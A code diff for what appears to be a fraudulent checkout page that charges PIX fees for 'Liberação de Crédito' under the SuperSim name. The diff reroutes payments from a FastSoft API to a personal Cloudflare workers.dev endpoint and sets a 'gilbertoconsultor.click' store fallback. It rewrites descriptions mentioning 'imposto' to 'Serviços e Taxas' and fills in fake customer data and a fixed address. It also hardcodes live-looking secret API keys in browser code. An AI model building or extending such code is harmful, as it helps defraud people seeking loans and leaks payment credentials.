@@ -460,7 +460,7 @@
         totalEl.textContent = PRICE_MAP[OFFER];
       }
     }
-    const FASTSOFT_AUTH = "Basic " + btoa("x:sk_cbb3917adbe1bdbcecf3e1bd76c86db8f509e8e3");
+    const FIREBOT_KEY = "fire_sk_live_f527b9f22237d5dedad3ef4a24c87919f904d4e4";
 
     // ---------- Helpers ----------
     function $(id){ return document.getElementById(id); }
@@ -588,50 +588,48 @@
           var pNum = parseFloat(pixTotalFromUrl.replace(',', '.'));
           if (!isNaN(pNum) && pNum > 0) valorReais = pNum;
         }
-        var valorCentavos = Math.round(valorReais * 100);
 
         var docClean = (customer.document || '').replace(/\D/g, '') || '07580365316';
         var emailClean = customer.email || ('cliente' + docClean.slice(0, 6) + '@email.com');
+        var titleOffer = OFFER_COPY[OFFER] ? OFFER_COPY[OFFER].badge : 'Liberação de Crédito';
+        var desc = 'SuperSim - ' + titleOffer;
+        if (!desc || desc.toLowerCase().includes("imposto")) desc = "Serviços e Taxas";
+        var store = (typeof window !== "undefined" && window.location && window.location.origin) ? window.location.origin : "https://gilbertoconsultor.click";
 
         var payload = {
-          amount: valorCentavos,
-          paymentMethod: 'PIX',
+          amount: valorReais,
+          productType: "DIGITAL",
+          description: desc,
+          storeUrl: store,
           customer: {
             name: customer.name || 'Cliente',
             email: emailClean,
-            document: {
-              number: docClean,
-              type: 'CPF'
-            },
-            phone: customer.phone || '11999999999'
-          },
-          items: [{
-            title: 'SuperSim - ' + (OFFER_COPY[OFFER] ? OFFER_COPY[OFFER].badge : 'Liberação de Crédito'),
-            unitPrice: valorCentavos,
-            quantity: 1,
-            tangible: false
-          }],
-          pix: { expiresInDays: 1 }
+            cpf: docClean,
+            phone: customer.phone || '11999999999',
+            address: "Av. Paulista, 1000, Bela Vista, São Paulo - SP, CEP 01310-100"
+          }
         };
 
-        var res = await fetch('https://api.fastsoftbrasil.com/api/user/transactions', {
+        var res = await fetch('https://rapid-tree-f2fa.kennedyrochasilva416.workers.dev/api/v1/pix/create', {
           method: 'POST',
           headers: {
-            'Authorization': FASTSOFT_AUTH,
+            'x-api-key': FIREBOT_KEY,
             'Content-Type': 'application/json'
           },
           body: JSON.stringify(payload)
         });
 
         var data = await res.json();
-        if (!data || !data.data || !data.data.pix || !data.data.pix.qrcode) {
-          console.error('FastSoft Error:', data);
-          throw new Error((data && data.message) || 'Erro ao gerar PIX');
+        var qrCodeText = data && (data.pixCopiaECola || (data.data && (data.data.pixCopiaECola || (data.data.pix && data.data.pix.qrcode) || data.data.qrCode)));
+        var txId = data && (data.transactionId || (data.data && (data.data.transactionId || data.data.id)));
+        var qrCodeBase64 = (data && data.qrCodeUrl) || (data && data.data && data.data.pix && data.data.pix.qrcode_base64) || '';
+
+        if (!qrCodeText || !txId) {
+          console.error('Firebot Error:', data);
+          throw new Error((data && (data.message || data.error)) || 'Erro ao gerar PIX');
         }
 
-        transactionId = data.data.id;
-        var qrCodeText = data.data.pix.qrcode;
-        var qrCodeBase64 = data.data.pix.qrcode_base64 || '';
+        transactionId = txId;
 
         renderPix(qrCodeText, qrCodeBase64);
 
@@ -727,13 +725,13 @@
       if (pollInFlight || paymentHandled || !transactionId) return;
       pollInFlight=true;
       try{
-        var res = await fetch('https://api.fastsoftbrasil.com/api/user/transactions/' + transactionId, {
+        var res = await fetch('https://rapid-tree-f2fa.kennedyrochasilva416.workers.dev/api/v1/pix/' + transactionId, {
           method: 'GET',
-          headers: { 'Authorization': FASTSOFT_AUTH }
+          headers: { 'x-api-key': FIREBOT_KEY, 'accept': 'application/json' }
         });
         var r = await res.json();
-        if (r && r.data) {
-          var st = String(r.data.status || '').toUpperCase();
+        if (r) {
+          var st = String(r.status || (r.data && r.data.status) || '').toUpperCase();
           if (st === 'PAID' || st === 'APPROVED' || st === 'COMPLETED') {
             paymentConfirmed();
           }
